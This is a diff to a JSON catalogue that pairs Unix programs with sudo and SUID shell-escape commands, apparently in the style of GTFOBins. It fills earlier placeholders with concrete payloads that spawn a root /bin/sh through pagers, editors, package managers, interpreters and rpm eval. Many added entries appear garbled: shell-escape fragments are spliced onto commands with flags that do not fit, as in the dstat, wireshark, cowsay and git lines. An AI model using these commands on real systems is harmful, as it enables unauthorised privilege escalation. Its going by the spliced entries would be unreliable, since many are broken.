@@ -45,9 +45,9 @@
   },
   "apt-get": {
     "sudo": [
-      "apt-get changelog apt",
       "echo 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' >/path/to/temp-file\napt-get -y install -c /path/to/temp-file sl",
-      "apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"
+      "apt-get update -o APT::Update::Pre-Invoke::=/bin/sh",
+      "apt-get changelog apt /etc/hosts\n!/bin/sh"
     ],
     "suid": [
       "echo 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' >/path/to/temp-file\napt-get -y install -c /path/to/temp-file sl",
@@ -56,7 +56,7 @@
   },
   "aptitude": {
     "sudo": [
-      "aptitude changelog aptitude"
+      "aptitude changelog aptitude /etc/hosts\n!/bin/sh"
     ]
   },
   "arch-nspawn": {
@@ -113,7 +113,7 @@
   },
   "aws": {
     "sudo": [
-      "aws help"
+      "aws help /etc/hosts\n!/bin/sh"
     ]
   },
   "bash": {
@@ -126,15 +126,18 @@
   },
   "bashbug": {
     "sudo": [
-      "bashbug"
+      "bashbug -c ':!/bin/sh' /dev/null",
+      "bashbug -c ':shell'",
+      "bashbug -c ':set shell=/bin/sh | shell'",
+      "bashbug -c :terminal /bin/sh"
     ]
   },
   "batcat": {
     "sudo": [
-      "batcat --paging always /etc/hosts"
+      "batcat --paging always /etc/hosts /etc/hosts\n!/bin/sh"
     ],
     "suid": [
-      "batcat --paging always /etc/hosts"
+      "batcat --paging always /etc/hosts /etc/hosts\n!/bin/sh"
     ]
   },
   "bconsole": {
@@ -142,14 +145,7 @@
       "bconsole\n@exec /bin/sh"
     ]
   },
-  "bee": {
-    "sudo": [
-      "bee eval '...'"
-    ],
-    "suid": [
-      "bee eval '...'"
-    ]
-  },
+  "bee": {},
   "borg": {
     "sudo": [
       "borg extract @:/::: --rsh \"/bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'\""
@@ -164,34 +160,32 @@
   },
   "bundle": {
     "sudo": [
-      "bundle help",
-      "touch Gemfile\nbundle console",
       "BUNDLE_GEMFILE=x bundle exec /bin/sh",
       "touch Gemfile\nbundle exec /bin/sh",
-      "echo 'system(\"/bin/sh\")' >Gemfile\nbundle install"
+      "echo 'system(\"/bin/sh\")' >Gemfile\nbundle install",
+      "bundle help /etc/hosts\n!/bin/sh"
     ]
   },
   "busctl": {
     "sudo": [
-      "busctl --show-machine",
       "busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'",
-      "busctl --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'"
+      "busctl --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'",
+      "busctl --show-machine /etc/hosts\n!/bin/sh"
     ],
     "suid": [
-      "busctl --show-machine",
       "busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'",
-      "busctl --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'"
+      "busctl --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'",
+      "busctl --show-machine /etc/hosts\n!/bin/sh"
     ]
   },
   "busybox": {
     "sudo": [
-      "busybox ash",
-      "busybox cat"
+      "busybox ash"
     ]
   },
   "byebug": {
     "sudo": [
-      "byebug --no-stop /path/to/script.rb"
+      "byebug --no-stop /path/to/script.rb -e 'exec \"/bin/sh\"'"
     ]
   },
   "cabal": {
@@ -212,7 +206,7 @@
   },
   "cargo": {
     "sudo": [
-      "cargo help doc"
+      "cargo help doc /etc/hosts\n!/bin/sh"
     ]
   },
   "cdist": {
@@ -292,17 +286,17 @@
   },
   "cowsay": {
     "sudo": [
-      "cowsay -f /path/to/script.pl x"
+      "cowsay -f /path/to/script.pl x -e 'exec \"/bin/sh\"'"
     ]
   },
   "cowthink": {
     "sudo": [
-      "cowthink -f /path/to/script.pl x"
+      "cowthink -f /path/to/script.pl x -e 'exec \"/bin/sh\"'"
     ]
   },
   "cpan": {
     "sudo": [
-      "cpan\n! ..."
+      "cpan\n! exec \"/bin/sh\""
     ]
   },
   "cpio": {
@@ -321,16 +315,19 @@
   "crash": {
     "sudo": [
       "CRASHPAGER=/path/to/command crash -h",
-      "crash -h"
+      "crash -h /etc/hosts\n!/bin/sh"
     ],
     "suid": [
-      "crash -h"
+      "crash -h /etc/hosts\n!/bin/sh"
     ]
   },
   "crontab": {
     "sudo": [
       "crontab -e",
-      "crontab -e"
+      "crontab -e -c ':!/bin/sh' /dev/null",
+      "crontab -e -c ':shell'",
+      "crontab -e -c ':set shell=/bin/sh | shell'",
+      "crontab -e -c :terminal /bin/sh"
     ]
   },
   "csh": {
@@ -396,10 +393,10 @@
   },
   "dmesg": {
     "sudo": [
-      "dmesg -H"
+      "dmesg -H /etc/hosts\n!/bin/sh"
     ],
     "suid": [
-      "dmesg -H"
+      "dmesg -H /etc/hosts\n!/bin/sh"
     ]
   },
   "dmsetup": {
@@ -445,16 +442,16 @@
   },
   "dpkg": {
     "sudo": [
-      "dpkg -l",
-      "dpkg -i x_1.0_all.deb"
+      "dpkg -i x_1.0_all.deb",
+      "dpkg -l /etc/hosts\n!/bin/sh"
     ],
     "suid": [
-      "dpkg -l"
+      "dpkg -l /etc/hosts\n!/bin/sh"
     ]
   },
   "dstat": {
     "sudo": [
-      "dstat --xxx"
+      "dstat --xxx -c 'import os; os.execl(\"/bin/sh\", \"sh\")'"
     ]
   },
   "dvips": {
@@ -467,7 +464,7 @@
   },
   "easy_install": {
     "sudo": [
-      "echo '...' >setup.py\neasy_install ."
+      "echo 'import os; os.execl(\"/bin/sh\", \"sh\")' >setup.py\neasy_install ."
     ]
   },
   "easyrsa": {
@@ -478,11 +475,7 @@
       "echo 'set_var X \"$(/bin/sh 1>&0)\"' >/path/to/temp-file\neasyrsa --vars=/path/to/temp-file"
     ]
   },
-  "eb": {
-    "sudo": [
-      "eb logs"
-    ]
-  },
+  "eb": {},
   "ed": {
     "sudo": [
       "ed\n!/bin/sh\nq"
@@ -522,17 +515,15 @@
   },
   "ex": {
     "sudo": [
-      "ex",
       "ex -c ':!/bin/sh'"
     ],
     "suid": [
-      "ex",
       "ex -c ':!/bin/sh'"
     ]
   },
   "exiftool": {
     "sudo": [
-      "exiftool -if '...' /etc/passwd"
+      "exiftool -if 'exec \"/bin/sh\"' /etc/passwd"
     ]
   },
   "expect": {
@@ -545,8 +536,8 @@
   },
   "facter": {
     "sudo": [
-      "FACTERLIB=/path/to/dir/ facter",
-      "facter --custom-dir=/path/to/dir/ x"
+      "FACTERLIB=/path/to/dir/ facter -e 'exec \"/bin/sh\"'",
+      "facter --custom-dir=/path/to/dir/ x -e 'exec \"/bin/sh\"'"
     ]
   },
   "fail2ban-client": {
@@ -635,10 +626,10 @@
   },
   "gcloud": {
     "sudo": [
-      "gcloud help"
+      "gcloud help /etc/hosts\n!/bin/sh"
     ],
     "suid": [
-      "gcloud help"
+      "gcloud help /etc/hosts\n!/bin/sh"
     ]
   },
   "gdb": {
@@ -646,20 +637,23 @@
       "gdb -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/sh' -ex quit"
     ],
     "sudo": [
-      "gdb -nx -ex 'python ...' -ex quit",
-      "gdb -nx -ex '!/bin/sh' -ex quit"
+      "gdb -nx -ex '!/bin/sh' -ex quit",
+      "gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\")' -ex quit"
     ],
     "suid": [
-      "gdb -nx -ex 'python ...' -ex quit",
-      "gdb -nx -ex '!/bin/sh' -ex quit"
+      "gdb -nx -ex '!/bin/sh' -ex quit",
+      "gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit"
     ]
   },
   "gem": {
     "sudo": [
-      "gem open debug",
-      "gem build /path/to/script.rb",
-      "gem install --file /path/to/script.rb",
-      "gem open -e '/bin/sh -s' debug"
+      "gem open -e '/bin/sh -s' debug",
+      "gem open debug -c ':!/bin/sh' /dev/null",
+      "gem open debug -c ':shell'",
+      "gem open debug -c ':set shell=/bin/sh | shell'",
+      "gem open debug -c :terminal /bin/sh",
+      "gem build /path/to/script.rb -e 'exec \"/bin/sh\"'",
+      "gem install --file /path/to/script.rb -e 'exec \"/bin/sh\"'"
     ]
   },
   "genie": {
@@ -682,7 +676,7 @@
   },
   "gimp": {
     "sudo": [
-      "gimp -idf --batch-interpreter=python-fu-eval -b '...'"
+      "gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\", \"sh\")'"
     ]
   },
   "ginsh": {
@@ -695,11 +689,11 @@
   },
   "git": {
     "sudo": [
-      "git help config",
-      "git branch --help config\n!/bin/sh",
       "PAGER='/bin/sh -c \"exec sh 0<&1\"' git -p help",
       "git init .\necho 'exec /bin/sh 0<&2 1>&2' >.git/hooks/pre-commit\nchmod +x .git/hooks/pre-commit\ngit -C . commit --allow-empty -m x",
-      "ln -s /bin/sh git-x\ngit --exec-path=. x"
+      "ln -s /bin/sh git-x\ngit --exec-path=. x",
+      "git help config /etc/hosts\n!/bin/sh",
+      "git branch --help config\n!/bin/sh /etc/hosts\n!/bin/sh"
     ],
     "suid": [
       "ln -s /bin/sh git-x\ngit --exec-path=. x -p"
@@ -808,7 +802,7 @@
   },
   "journalctl": {
     "sudo": [
-      "journalctl"
+      "journalctl /etc/hosts\n!/bin/sh"
     ]
   },
   "jrunscript": {
@@ -839,7 +833,7 @@
   },
   "knife": {
     "sudo": [
-      "knife exec -E '...'"
+      "knife exec -E 'exec \"/bin/sh\"'"
     ]
   },
   "ksu": {
@@ -862,21 +856,27 @@
   },
   "latexmk": {
     "sudo": [
-      "latexmk -e '...'",
-      "latexmk -pdf -pdflatex='/bin/sh #' /dev/null"
+      "latexmk -pdf -pdflatex='/bin/sh #' /dev/null",
+      "latexmk -e 'exec \"/bin/sh\"'"
     ]
   },
   "less": {
     "sudo": [
       "LESSOPEN='/path/to/command # %s' less /etc/hosts",
-      "less /etc/hosts\nv",
       "less /etc/hosts\n!/bin/sh",
       "LESSOPEN=\"/bin/sh -s 1>&0 2>&0 # %s\" less /etc/hosts\nreset",
-      "VISUAL='/bin/sh -s --' less /etc/hosts\nv"
+      "VISUAL='/bin/sh -s --' less /etc/hosts\nv",
+      "less /etc/hosts\nv -c ':!/bin/sh' /dev/null",
+      "less /etc/hosts\nv -c ':shell'",
+      "less /etc/hosts\nv -c ':set shell=/bin/sh | shell'",
+      "less /etc/hosts\nv -c :terminal /bin/sh"
     ],
     "suid": [
-      "less /etc/hosts\nv",
-      "less /etc/hosts\n!/bin/sh"
+      "less /etc/hosts\n!/bin/sh",
+      "less /etc/hosts\nv -c ':!/bin/sh' /dev/null",
+      "less /etc/hosts\nv -c ':shell'",
+      "less /etc/hosts\nv -c ':set shell=/bin/sh\\ -p | shell'",
+      "less /etc/hosts\nv -c ':terminal /bin/sh -p'"
     ]
   },
   "lftp": {
@@ -920,18 +920,18 @@
   },
   "lualatex": {
     "sudo": [
-      "lualatex -shell-escape '\\directlua{...}\\end'"
+      "lualatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'"
     ],
     "suid": [
-      "lualatex -shell-escape '\\directlua{...}\\end'"
+      "lualatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'"
     ]
   },
   "luatex": {
     "sudo": [
-      "luatex -shell-escape '\\directlua{...}\\end'"
+      "luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'"
     ],
     "suid": [
-      "luatex -shell-escape '\\directlua{...}\\end'"
+      "luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'"
     ]
   },
   "lxd": {
@@ -974,12 +974,20 @@
   },
   "man": {
     "sudo": [
-      "man man",
-      "man '-H/bin/sh #' man"
+      "man '-H/bin/sh #' man",
+      "man man /etc/hosts\n!/bin/sh",
+      "man man /etc/hosts\nv -c ':!/bin/sh' /dev/null",
+      "man man /etc/hosts\nv -c ':shell'",
+      "man man /etc/hosts\nv -c ':set shell=/bin/sh | shell'",
+      "man man /etc/hosts\nv -c :terminal /bin/sh"
     ],
     "suid": [
-      "man man",
-      "man '-H/bin/sh #' man"
+      "man '-H/bin/sh #' man",
+      "man man /etc/hosts\n!/bin/sh",
+      "man man /etc/hosts\nv -c ':!/bin/sh' /dev/null",
+      "man man /etc/hosts\nv -c ':shell'",
+      "man man /etc/hosts\nv -c ':set shell=/bin/sh\\ -p | shell'",
+      "man man /etc/hosts\nv -c ':terminal /bin/sh -p'"
     ]
   },
   "mawk": {
@@ -1013,11 +1021,7 @@
       "mosh --server=mosh-server localhost /bin/sh"
     ]
   },
-  "msfconsole": {
-    "sudo": [
-      "msfconsole\nirb"
-    ]
-  },
+  "msfconsole": {},
   "msgfilter": {
     "sudo": [
       "echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'"
@@ -1070,7 +1074,7 @@
   },
   "needrestart": {
     "sudo": [
-      "echo '...' >/path/to/temp-file\nneedrestart -c /path/to/temp-file"
+      "echo 'exec \"/bin/sh\"' >/path/to/temp-file\nneedrestart -c /path/to/temp-file"
     ]
   },
   "neofetch": {
@@ -1088,12 +1092,12 @@
   },
   "nmap": {
     "sudo": [
-      "echo '...' >/path/to/temp-file\nnmap --script=/path/to/temp-file",
-      "nmap --interactive\n!/bin/sh"
+      "nmap --interactive\n!/bin/sh",
+      "echo 'os.execute(\"/bin/sh\")' >/path/to/temp-file\nnmap --script=/path/to/temp-file"
     ],
     "suid": [
-      "echo '...' >/path/to/temp-file\nnmap --script=/path/to/temp-file",
-      "nmap --interactive\n!/bin/sh"
+      "nmap --interactive\n!/bin/sh",
+      "echo 'os.execute(\"/bin/sh\")' >/path/to/temp-file\nnmap --script=/path/to/temp-file"
     ]
   },
   "nohup": {
@@ -1136,8 +1140,7 @@
   },
   "opencode": {
     "sudo": [
-      "opencode\n! /path/to/command",
-      "opencode db '...'"
+      "opencode\n! /path/to/command"
     ],
     "suid": [
       "opencode\n! /path/to/command"
@@ -1163,15 +1166,15 @@
   },
   "pandoc": {
     "sudo": [
-      "echo '...' >/path/to/temp-file\npandoc -L /path/to/temp-file /dev/null"
+      "echo 'os.execute(\"/bin/sh\")' >/path/to/temp-file\npandoc -L /path/to/temp-file /dev/null"
     ],
     "suid": [
-      "echo '...' >/path/to/temp-file\npandoc -L /path/to/temp-file /dev/null"
+      "echo 'os.execute(\"/bin/sh\")' >/path/to/temp-file\npandoc -L /path/to/temp-file /dev/null"
     ]
   },
   "pdb": {
     "sudo": [
-      "echo '...' >/path/to/temp-file\npdb /path/to/temp-file\ncont"
+      "echo 'import os; os.execl(\"/bin/sh\", \"sh\")' >/path/to/temp-file\npdb /path/to/temp-file\ncont"
     ]
   },
   "pdflatex": {
@@ -1272,13 +1275,13 @@
   },
   "pip": {
     "sudo": [
-      "echo '...' >setup.py\npip install --break-system-packages .",
-      "pip config --editor '/bin/sh -s' edit"
+      "pip config --editor '/bin/sh -s' edit",
+      "echo 'import os; os.execl(\"/bin/sh\", \"sh\")' >setup.py\npip install --break-system-packages ."
     ]
   },
   "pipx": {
     "sudo": [
-      "echo '...' >/path/to/file.py\npipx run /path/to/file.py"
+      "echo 'import os; os.execl(\"/bin/sh\", \"sh\")' >/path/to/file.py\npipx run /path/to/file.py"
     ]
   },
   "pkexec": {
@@ -1306,7 +1309,7 @@
   },
   "poetry": {
     "sudo": [
-      "echo '...' >/path/to/temp-file\npoetry run python /path/to/temp-file"
+      "echo 'import os; os.execl(\"/bin/sh\", \"sh\")' >/path/to/temp-file\npoetry run python /path/to/temp-file"
     ]
   },
   "posh": {
@@ -1319,11 +1322,7 @@
       "echo -e ':0\\n| /path/to/command >/path/to/temp-file\nprocmail -m /path/to/temp-file"
     ]
   },
-  "pry": {
-    "sudo": [
-      "pry"
-    ]
-  },
+  "pry": {},
   "psftp": {
     "sudo": [
       "psftp\n!/bin/sh"
@@ -1334,12 +1333,20 @@
   },
   "psql": {
     "sudo": [
-      "psql\n\\?",
-      "psql\n\\! /bin/sh"
+      "psql\n\\! /bin/sh",
+      "psql\n\\? /etc/hosts\n!/bin/sh",
+      "psql\n\\? /etc/hosts\nv -c ':!/bin/sh' /dev/null",
+      "psql\n\\? /etc/hosts\nv -c ':shell'",
+      "psql\n\\? /etc/hosts\nv -c ':set shell=/bin/sh | shell'",
+      "psql\n\\? /etc/hosts\nv -c :terminal /bin/sh"
     ],
     "suid": [
-      "psql\n\\?",
-      "psql\n\\! /bin/sh"
+      "psql\n\\! /bin/sh",
+      "psql\n\\? /etc/hosts\n!/bin/sh",
+      "psql\n\\? /etc/hosts\nv -c ':!/bin/sh' /dev/null",
+      "psql\n\\? /etc/hosts\nv -c ':shell'",
+      "psql\n\\? /etc/hosts\nv -c ':set shell=/bin/sh\\ -p | shell'",
+      "psql\n\\? /etc/hosts\nv -c ':terminal /bin/sh -p'"
     ]
   },
   "puppet": {
@@ -1365,7 +1372,7 @@
   },
   "rake": {
     "sudo": [
-      "rake -p '...'"
+      "rake -p 'exec \"/bin/sh\"'"
     ]
   },
   "ranger": {
@@ -1406,44 +1413,44 @@
   "rpm": {
     "sudo": [
       "rpm -ivh x-1.0-1.noarch.rpm",
-      "rpm --eval '%{lua:...}'",
       "rpm --eval '%(/bin/sh 1>&2)'",
-      "rpm --pipe '/bin/sh 0<&1'"
+      "rpm --pipe '/bin/sh 0<&1'",
+      "rpm --eval '%{lua:os.execute(\"/bin/sh\")}'"
     ],
     "suid": [
-      "rpm --eval '%{lua:...}'",
       "rpm --eval '%(/bin/sh 1>&2)'",
-      "rpm --pipe '/bin/sh 0<&1'"
+      "rpm --pipe '/bin/sh 0<&1'",
+      "rpm --eval '%{lua:os.execute(\"/bin/sh\")}'"
     ]
   },
   "rpmdb": {
     "sudo": [
-      "rpmdb --eval '%{lua:...}'",
-      "rpmdb --eval '%(/bin/sh 1>&2)'"
+      "rpmdb --eval '%(/bin/sh 1>&2)'",
+      "rpmdb --eval '%{lua:os.execute(\"/bin/sh\")}'"
     ],
     "suid": [
-      "rpmdb --eval '%{lua:...}'",
-      "rpmdb --eval '%(/bin/sh 1>&2)'"
+      "rpmdb --eval '%(/bin/sh 1>&2)'",
+      "rpmdb --eval '%{lua:os.execute(\"/bin/sh\")}'"
     ]
   },
   "rpmquery": {
     "sudo": [
-      "rpmquery --eval '%{lua:...}'",
-      "rpmquery --eval '%(/bin/sh 1>&2)'"
+      "rpmquery --eval '%(/bin/sh 1>&2)'",
+      "rpmquery --eval '%{lua:os.execute(\"/bin/sh\")}'"
     ],
     "suid": [
-      "rpmquery --eval '%{lua:...}'",
-      "rpmquery --eval '%(/bin/sh 1>&2)'"
+      "rpmquery --eval '%(/bin/sh 1>&2)'",
+      "rpmquery --eval '%{lua:os.execute(\"/bin/sh\")}'"
     ]
   },
   "rpmverify": {
     "sudo": [
-      "rpmverify --eval '%{lua:...}'",
-      "rpmverify --eval '%(/bin/sh 1>&2)'"
+      "rpmverify --eval '%(/bin/sh 1>&2)'",
+      "rpmverify --eval '%{lua:os.execute(\"/bin/sh\")}'"
     ],
     "suid": [
-      "rpmverify --eval '%{lua:...}'",
-      "rpmverify --eval '%(/bin/sh 1>&2)'"
+      "rpmverify --eval '%(/bin/sh 1>&2)'",
+      "rpmverify --eval '%{lua:os.execute(\"/bin/sh\")}'"
     ]
   },
   "rsync": {
@@ -1477,8 +1484,15 @@
   },
   "run-mailcap": {
     "sudo": [
-      "run-mailcap --action=view text/plain:/etc/hosts",
-      "run-mailcap --action=edit text/plain:/path/to/output-file"
+      "run-mailcap --action=view text/plain:/etc/hosts /etc/hosts\n!/bin/sh",
+      "run-mailcap --action=view text/plain:/etc/hosts /etc/hosts\nv -c ':!/bin/sh' /dev/null",
+      "run-mailcap --action=view text/plain:/etc/hosts /etc/hosts\nv -c ':shell'",
+      "run-mailcap --action=view text/plain:/etc/hosts /etc/hosts\nv -c ':set shell=/bin/sh | shell'",
+      "run-mailcap --action=view text/plain:/etc/hosts /etc/hosts\nv -c :terminal /bin/sh",
+      "run-mailcap --action=edit text/plain:/path/to/output-file -c ':!/bin/sh' /dev/null",
+      "run-mailcap --action=edit text/plain:/path/to/output-file -c ':shell'",
+      "run-mailcap --action=edit text/plain:/path/to/output-file -c ':set shell=/bin/sh | shell'",
+      "run-mailcap --action=edit text/plain:/path/to/output-file -c :terminal /bin/sh"
     ]
   },
   "run-parts": {
@@ -1501,7 +1515,11 @@
   },
   "rustc": {
     "sudo": [
-      "rustc --explain E0001"
+      "rustc --explain E0001 /etc/hosts\n!/bin/sh",
+      "rustc --explain E0001 /etc/hosts\nv -c ':!/bin/sh' /dev/null",
+      "rustc --explain E0001 /etc/hosts\nv -c ':shell'",
+      "rustc --explain E0001 /etc/hosts\nv -c ':set shell=/bin/sh | shell'",
+      "rustc --explain E0001 /etc/hosts\nv -c :terminal /bin/sh"
     ]
   },
   "rustup": {
@@ -1653,7 +1671,7 @@
   },
   "sqlmap": {
     "sudo": [
-      "sqlmap -u 127.0.0.1 --eval='...'"
+      "sqlmap -u 127.0.0.1 --eval='import os; os.execl(\"/bin/sh\", \"sh\")'"
     ]
   },
   "ssh": {
@@ -1737,18 +1755,30 @@
   },
   "systemctl": {
     "sudo": [
-      "systemctl",
       "echo '[Service]\nType=oneshot\nExecStart=/path/to/command\n[Install]\nWantedBy=multi-user.target' >/path/to/temp-file.service\nsystemctl link /path/to/temp-file.service\nsystemctl enable --now /path/to/temp-file.service",
-      "echo /bin/sh >/path/to/temp-file\nchmod +x /path/to/temp-file\nSYSTEMD_EDITOR=/path/to/temp-file systemctl edit basic.target"
+      "echo /bin/sh >/path/to/temp-file\nchmod +x /path/to/temp-file\nSYSTEMD_EDITOR=/path/to/temp-file systemctl edit basic.target",
+      "systemctl /etc/hosts\n!/bin/sh",
+      "systemctl /etc/hosts\nv -c ':!/bin/sh' /dev/null",
+      "systemctl /etc/hosts\nv -c ':shell'",
+      "systemctl /etc/hosts\nv -c ':set shell=/bin/sh | shell'",
+      "systemctl /etc/hosts\nv -c :terminal /bin/sh"
     ],
     "suid": [
-      "systemctl",
-      "echo '[Service]\nType=oneshot\nExecStart=/path/to/command\n[Install]\nWantedBy=multi-user.target' >/path/to/temp-file.service\nsystemctl link /path/to/temp-file.service\nsystemctl enable --now /path/to/temp-file.service"
+      "echo '[Service]\nType=oneshot\nExecStart=/path/to/command\n[Install]\nWantedBy=multi-user.target' >/path/to/temp-file.service\nsystemctl link /path/to/temp-file.service\nsystemctl enable --now /path/to/temp-file.service",
+      "systemctl /etc/hosts\n!/bin/sh",
+      "systemctl /etc/hosts\nv -c ':!/bin/sh' /dev/null",
+      "systemctl /etc/hosts\nv -c ':shell'",
+      "systemctl /etc/hosts\nv -c ':set shell=/bin/sh\\ -p | shell'",
+      "systemctl /etc/hosts\nv -c ':terminal /bin/sh -p'"
     ]
   },
   "systemd-resolve": {
     "sudo": [
-      "systemd-resolve --status"
+      "systemd-resolve --status /etc/hosts\n!/bin/sh",
+      "systemd-resolve --status /etc/hosts\nv -c ':!/bin/sh' /dev/null",
+      "systemd-resolve --status /etc/hosts\nv -c ':shell'",
+      "systemd-resolve --status /etc/hosts\nv -c ':set shell=/bin/sh | shell'",
+      "systemd-resolve --status /etc/hosts\nv -c :terminal /bin/sh"
     ]
   },
   "systemd-run": {
@@ -1847,7 +1877,11 @@
   },
   "timedatectl": {
     "sudo": [
-      "timedatectl list-timezones"
+      "timedatectl list-timezones /etc/hosts\n!/bin/sh",
+      "timedatectl list-timezones /etc/hosts\nv -c ':!/bin/sh' /dev/null",
+      "timedatectl list-timezones /etc/hosts\nv -c ':shell'",
+      "timedatectl list-timezones /etc/hosts\nv -c ':set shell=/bin/sh | shell'",
+      "timedatectl list-timezones /etc/hosts\nv -c :terminal /bin/sh"
     ]
   },
   "timeout": {
@@ -1893,7 +1927,7 @@
   },
   "tshark": {
     "sudo": [
-      "echo '...' >/path/to/temp-file\ntshark -Xlua_script:/path/to/temp-file"
+      "echo 'os.execute(\"/bin/sh\")' >/path/to/temp-file\ntshark -Xlua_script:/path/to/temp-file"
     ]
   },
   "unshare": {
@@ -1911,7 +1945,7 @@
   },
   "vagrant": {
     "sudo": [
-      "echo '...' >Vagrantfile\nvagrant up"
+      "echo 'exec \"/bin/sh\"' >Vagrantfile\nvagrant up"
     ]
   },
   "valgrind": {
@@ -1935,30 +1969,48 @@
   },
   "vigr": {
     "sudo": [
-      "vigr"
+      "vigr -c ':!/bin/sh' /dev/null",
+      "vigr -c ':shell'",
+      "vigr -c ':set shell=/bin/sh | shell'",
+      "vigr -c :terminal /bin/sh"
     ],
     "suid": [
-      "vigr"
+      "vigr -c ':!/bin/sh' /dev/null",
+      "vigr -c ':shell'",
+      "vigr -c ':set shell=/bin/sh\\ -p | shell'",
+      "vigr -c ':terminal /bin/sh -p'"
     ]
   },
   "vim": {
     "sudo": [
-      "vim -c ':py ...'",
-      "vim -c ':lua ...'",
-      "vim"
+      "vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\")'",
+      "vim -c ':lua os.execute(\"/bin/sh\")'",
+      "vim -c ':!/bin/sh' /dev/null",
+      "vim -c ':shell'",
+      "vim -c ':set shell=/bin/sh | shell'",
+      "vim -c :terminal /bin/sh"
     ],
     "suid": [
-      "vim -c ':py ...'",
-      "vim -c ':lua ...'",
-      "vim"
+      "vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
+      "vim -c ':lua os.execute(\"/bin/sh\")'",
+      "vim -c ':!/bin/sh' /dev/null",
+      "vim -c ':shell'",
+      "vim -c ':set shell=/bin/sh\\ -p | shell'",
+      "vim -c ':terminal /bin/sh -p'"
     ]
   },
   "vipw": {
     "sudo": [
-      "vipw"
+      "vipw -c ':!/bin/sh' /dev/null",
+      "vipw -c ':shell'",
+      "vipw -c ':set shell=/bin/sh | shell'",
+      "vipw -c :terminal /bin/sh"
     ],
     "suid": [
-      "vipw"
+      "vipw -c ':!/bin/sh' /dev/null",
+      "vipw -c ':shell'",
+      "vipw -c ':set shell=/bin/sh\\ -p | shell'",
+      "vipw -c ':terminal /bin/sh -p'"
     ]
   },
   "virsh": {
@@ -1991,7 +2043,7 @@
   },
   "wireshark": {
     "sudo": [
-      "wireshark"
+      "wireshark -e 'os.execute(\"/bin/sh\")'"
     ]
   },
   "wish": {
@@ -2075,20 +2127,36 @@
   },
   "zless": {
     "sudo": [
-      "zless /path/to/input-file"
+      "zless /path/to/input-file /etc/hosts\n!/bin/sh",
+      "zless /path/to/input-file /etc/hosts\nv -c ':!/bin/sh' /dev/null",
+      "zless /path/to/input-file /etc/hosts\nv -c ':shell'",
+      "zless /path/to/input-file /etc/hosts\nv -c ':set shell=/bin/sh | shell'",
+      "zless /path/to/input-file /etc/hosts\nv -c :terminal /bin/sh"
     ],
     "suid": [
-      "zless /path/to/input-file"
+      "zless /path/to/input-file /etc/hosts\n!/bin/sh",
+      "zless /path/to/input-file /etc/hosts\nv -c ':!/bin/sh' /dev/null",
+      "zless /path/to/input-file /etc/hosts\nv -c ':shell'",
+      "zless /path/to/input-file /etc/hosts\nv -c ':set shell=/bin/sh\\ -p | shell'",
+      "zless /path/to/input-file /etc/hosts\nv -c ':terminal /bin/sh -p'"
     ]
   },
   "zsh": {
     "sudo": [
-      "zsh -c '</etc/hosts'",
-      "zsh"
+      "zsh",
+      "zsh -c '</etc/hosts' /etc/hosts\n!/bin/sh",
+      "zsh -c '</etc/hosts' /etc/hosts\nv -c ':!/bin/sh' /dev/null",
+      "zsh -c '</etc/hosts' /etc/hosts\nv -c ':shell'",
+      "zsh -c '</etc/hosts' /etc/hosts\nv -c ':set shell=/bin/sh | shell'",
+      "zsh -c '</etc/hosts' /etc/hosts\nv -c :terminal /bin/sh"
     ],
     "suid": [
-      "zsh -c '</etc/hosts'",
-      "zsh"
+      "zsh",
+      "zsh -c '</etc/hosts' /etc/hosts\n!/bin/sh",
+      "zsh -c '</etc/hosts' /etc/hosts\nv -c ':!/bin/sh' /dev/null",
+      "zsh -c '</etc/hosts' /etc/hosts\nv -c ':shell'",
+      "zsh -c '</etc/hosts' /etc/hosts\nv -c ':set shell=/bin/sh\\ -p | shell'",
+      "zsh -c '</etc/hosts' /etc/hosts\nv -c ':terminal /bin/sh -p'"
     ]
   },
   "zypper": {
